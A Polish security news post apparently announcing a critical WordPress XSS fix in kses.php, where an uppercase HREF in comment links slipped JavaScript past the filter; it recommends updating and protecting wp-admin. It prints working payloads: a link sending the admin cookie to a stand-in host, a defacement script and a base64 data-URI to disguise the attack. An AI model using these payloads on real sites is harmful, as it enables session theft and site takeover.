WordPress właśnie wypuścił “krytyczną” poprawkę bezpieczeństwa na błąd typu XSS, który może zostać wykorzystany przez atakującego do wykradzenia ciastka administratora i przejęcia kontroli nad blogiem. Zalecamy szybką aktualizację, poniżej szczegóły błędu. Kradzież ciastka administratora Błąd znajduje się w pliku kses.php, a wynika z niedokładnego filtrowania atrybutu “href” w linkach będących częścią komentarzy pochodzących od użytkowników. Jeśli atrybut jest zapisany dużymi literami, można przemycić w nim kod JavaScript: <a HREF="javascript:alert(0)">kliknij tutaj</a> co oczywiście umożliwia atakującemu przeprowadzenie ataku polegającego na wykradzeniu ciastka administratora… Podobne ataki ćwiczymy na naszych szkoleniach z bezpieczeństwa webaplikacji — śpieszcie się, na styczeń 2011 zostały już tylko 4 wolne miejsca Oto przykładowy kod kradnący ciastko: <a HREF="javascript:open('http://foo.bar/?zoot=' + document.cookie)">kliknij tu</a> Atakujący może również przeprowadzić “deface” strony: <a HREF="javascript:eval(document.getElementById('site-title').innerHTML+=' 
IMPORTANT WORDPRESS UPDATE, go to badsite.com to download it!');">nice site</a> co będzie wyglądać tak: Warunek dla powyższych “exploitów”: administrator musi kliknąć na podstawiony link. Dlatego też, aby zwiększyć skuteczność ataku warto ukryć jego zawartość (bo pewnie wielu administratorów zorientuje się, że coś jest nie tak, kiedy w linku zobaczą javascript:foobar): <a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgvbmllYm
V6cGllY3puaWsvKTwvc2NyaXB0Pg==">kliknij tu</a> Ochrona przed XSS-em WordPress wypuścił już nową wersję 3.0.4, wystarczy się zaktualizować. Przy okazji, warto dodatkowo założyć HTTP Authentication na katalog wp-admin — dzięki temu, nawet jeśli komuś kiedyś uda się wykraść ciastko administratora (np. za pomocą takiego jak powyżej błędu), będzie miał kolejne zabezpieczenie do pokonania, zanim zacznie psocić wam na blogu ;) podesłał koto ,Piotr Konieczny